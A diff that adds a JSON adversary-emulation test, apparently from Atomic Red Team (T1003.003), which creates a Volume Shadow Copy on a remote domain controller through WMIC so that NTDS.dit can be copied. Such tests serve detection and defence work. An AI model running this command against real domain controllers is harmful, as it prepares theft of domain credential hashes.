@@ -1,0 +1,92 @@
+{
+  "id": "d893459f-71f0-484d-9808-ec83b2b64226",
+  "name": "Create Volume Shadow Copy remotely with WMI",
+  "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "1fe54f9b-16b7-4cbd-b375-6a61d8d3b7b8",
+      "type": "execute-command",
+      "data": {
+        "command": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "269a1696-1747-4000-ae5a-ff335c06505a",
+      "name": "Check dependency 1/1",
+      "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
+      "type": "execute-command",
+      "data": {
+        "command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c19e0a10-002e-4273-9411-1353559755d2",
+      "name": "Resolve dependency 1/1",
+      "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
+      "type": "execute-command",
+      "data": {
+        "command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b6fbe5a3-f616-4d88-a35e-8c671750535c",
+      "name": "Re-check dependency 1/1",
+      "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
+      "type": "execute-command",
+      "data": {
+        "command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "269a1696-1747-4000-ae5a-ff335c06505a",
+      "p": "on-success",
+      "o": "1fe54f9b-16b7-4cbd-b375-6a61d8d3b7b8"
+    },
+    {
+      "s": "269a1696-1747-4000-ae5a-ff335c06505a",
+      "p": "on-failure",
+      "o": "c19e0a10-002e-4273-9411-1353559755d2"
+    },
+    {
+      "s": "c19e0a10-002e-4273-9411-1353559755d2",
+      "p": "on-success",
+      "o": "b6fbe5a3-f616-4d88-a35e-8c671750535c"
+    },
+    {
+      "s": "b6fbe5a3-f616-4d88-a35e-8c671750535c",
+      "p": "on-failure",
+      "o": "1fe54f9b-16b7-4cbd-b375-6a61d8d3b7b8"
+    }
+  ],
+  "tags": [
+    "T1003.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "drive_letter",
+      "type": "string",
+      "description": "Drive letter to source VSC (including colon and backslash)",
+      "value": "C:\\"
+    },
+    {
+      "name": "target_host",
+      "type": "string",
+      "description": "IP Address / Hostname you want to target",
+      "value": "localhost"
+    }
+  ]
+}
